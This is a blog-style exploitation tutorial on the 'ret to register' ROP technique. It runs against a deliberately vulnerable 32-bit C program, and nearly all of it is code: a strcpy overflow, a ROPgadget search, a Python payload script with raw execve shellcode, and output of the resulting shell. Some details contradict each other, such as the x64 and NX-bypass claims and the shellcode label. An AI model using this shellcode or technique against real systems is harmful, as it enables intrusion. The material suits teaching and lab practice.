---
layout: post
title: "[ROP] Ret to register"
categories: [pwn]
tags: [pwn, ROP]
description: How to bypass NX/ASLR protections using "ret to register" attack on a x64 Linux system.
---

Tools:
1. objdump
2. ROPgadget

Binary protection:
1. ASLR

Compilation: Dynamic

Architecture: x86

Operating System: Linux (Debian)

# 1. Explanation
Today I will show you an other method to exploit Return Oriented Programming. It name is "ret to register". Thanks to register we will be able to execute a shellcode.

In assemby language (x86/x64) when we call a function, his return value is stored in the RAX/EAX register. For exemple, the strcpy return a pointer to the destination string. It means that if we overflow the saved "RIP/EIP" register with a gadget like "call eax/jmp eax" we will jump to the stack wich contain us shellcode !

This method is very usefull but it needed to have the NX bit disable.

# 2. Vulnerable binary
```c
#include <string.h>

// gcc main.c -z execstack -fno-stack-protector -m32

char *vuln(char *str)
{
  char buf[128];

  strcpy(buf, str);
}

int main(int ac, char **av)
{
  vuln(av[1]);
  return 0;
}
```

It's a very simple program that contain an overflow to the "strcpy" call. We will use the overflow to exploit this program.

# 3. The payload
The payload will look like:
```bash
+-----------------+
|    shellcode    |
+-----------------+
|     padding     |
+-----------------+
|    call eax     |
+-----------------+
```

The only things we need is the "call eax" gadget, always thanks to ROPgadget:
```bash
$ ROPgadget --binary a.out | grep "call eax"
...
0x08048363 : call eax
...
```

For the shellcode, I choose simple "execve('/bin/dash', NULL, NULL)", 38 bytes lenght.
And that's it for the payload !

The whole payload will look:
```python
#!/usr/bin/env python2.7

from struct import pack

#
# Shellcode execve("/bin/dash", NULL, NULL) (38 bytes)
#

shellcode = "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

payload = shellcode + '\x90' * 102 # Padding

payload += pack("<I", 0x08048363) # call eax

print payload
```

# 4. Exploitation
We test our payload:
```bash
$ ./a.out $(python rop.py)
id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
```

Done.
